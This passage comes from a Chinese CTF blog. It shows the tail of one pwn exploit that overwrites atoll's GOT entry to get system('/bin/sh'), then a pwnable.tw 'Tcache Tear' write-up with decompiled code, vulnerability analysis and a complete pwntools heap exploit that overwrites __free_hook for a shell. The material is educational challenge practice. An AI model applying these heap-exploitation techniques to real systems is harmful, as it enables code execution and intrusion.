<span class="n">atoll_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoll&#39;</span><span class="p">]</span>
<span class="n">printf_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">atoll_got</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">atoll_got</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Index:&#34;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%6$p&#39;</span><span class="p">)</span>
<span class="n">stdout_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="n">stdout_addr</span> <span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span>
<span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc: &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">15</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Data:&#34;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>

<span class="c1"># gdb.attach(p)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Index:&#34;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><p>由于延迟原因（<del>辣鸡校园网</del>，建议使用<code>sh.recvuntil('xxx');sh.send('xxx')</code>而不是<code>sendlineafter</code>。</p>
<h1 id="pwnabletw-tcache-tear">pwnable.tw-Tcache Tear</h1>
<h2 id="checksec-3">checksec</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    FORTIFY:  Enabled
</code></pre></td></tr></table>
</div>
</div><h2 id="ida-3">IDA</h2>
<p><strong>add</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">add</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Size:&#34;</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">choice</span><span class="p">();</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&lt;=</span> <span class="mh">0xFF</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Data:&#34;</span><span class="p">);</span>
    <span class="n">my_read</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">ptr</span><span class="p">,</span> <span class="n">size</span> <span class="o">-</span> <span class="mi">16</span><span class="p">);</span>
    <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Done !&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>main</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
</span><span class="c1"></span>
  <span class="n">Init</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name:&#34;</span><span class="p">);</span>
  <span class="n">my_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">name</span><span class="p">,</span> <span class="mi">32LL</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">menu</span><span class="p">();</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="n">choice</span><span class="p">();</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&lt;=</span> <span class="mi">7</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
        <span class="o">++</span><span class="n">v4</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">show</span><span class="p">();</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
          <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nl">LABEL_14</span><span class="p">:</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid choice&#34;</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_14</span><span class="p">;</span>
      <span class="n">add</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>show</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">ssize_t</span> <span class="nf">show</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name :&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">name</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>漏洞点有两个地方:</p>
<ul>
<li>free后指针未清零，对本题来说可以造成UAF</li>
<li>在add函数中，若size&lt;16，则会整数溢出，可写入任意长度数据</li>
</ul>
<p>got表不可写，同时也没有输出函数，只有将名字进行输出。首先，想办法进行leak，通过uaf，我们可以对任意已知地址的内存进行读写，所以我们将name所在的内存伪造成一个large chunk，将其free，再show就可以leak libc，之后就是简单了。</p>
<p>为了成功将large chunk进行free，我们需要构造三个chunk，看下面的这段代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">nextsize</span> <span class="o">=</span> <span class="n">chunksize</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">nextchunk</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
	<span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">nextsize</span> <span class="o">&gt;=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;free(): invalid next size (normal)&#34;</span><span class="p">);</span>
	<span class="err">···</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">nextchunk</span> <span class="o">!=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">)</span> <span class="p">{</span>
      <span class="cm">/* get and clear inuse bit */</span>
      <span class="n">nextinuse</span> <span class="o">=</span> <span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span> <span class="n">nextsize</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>该段代码检查free的chunk的nextchunk大小是否满足要求，还检查了nextchunk的inuse位，这一位在nextchunk的nextchunk中，所以我们要伪造三个chunk。</p>
<p>首先，先将两个nextchunk构造出来，在<code>name+0x500</code>的地方伪造通过任意地址读写伪造两个<code>0x20</code>的chunk，之后在将name的chunk取出free掉。</p>
<h2 id="exp-3">exp</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># from LibcSearcher import LibcSearcher</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">leak</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{0}</span><span class="s1"> addr ---&gt; </span><span class="si">{1}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>

<span class="n">binary</span><span class="o">=</span><span class="s1">&#39;./tcache_tear&#39;</span>
<span class="c1">#gdb.attach(sh)</span>
<span class="k">if</span> <span class="s1">&#39;g&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
<span class="k">if</span> <span class="s1">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span> <span class="s1">&#39;r&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Test in local...&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="k">if</span> <span class="s1">&#39;r&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Attacking...&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chall.pwnable.tw&#39;</span><span class="p">,</span> <span class="mi">10207</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so&#39;</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Size:&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Data:&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>

<span class="n">name</span> <span class="o">=</span> <span class="mh">0x602060</span>
<span class="n">one</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x4f2c5</span><span class="p">,</span> <span class="mh">0x4f322</span><span class="p">,</span><span class="mh">0x10a38c</span><span class="p">]</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x501</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1"># 0x100</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">free</span><span class="p">()</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="mh">0x500</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="mh">0x10</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="c1"># gdb.attach(sh)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mi">96</span> <span class="o">-</span> <span class="mh">0x10</span> 
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">one</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;libc base&#39;</span><span class="p">,</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
<span class="n">free</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="lilac-2021-五一欢乐赛">Lilac 2021 五一欢乐赛</h1>
<p><del>假期没人约</del>，没事干又不想写作业只能a题了，去年十一的时候第一次做Lilac的题，5天做出一道（太菜了。这次把题AK了，很开心</p>
<!--more-->
<h1 id="babyfat">babyFAT</h1>
<h2 id="checksec-4">checksec</h2>
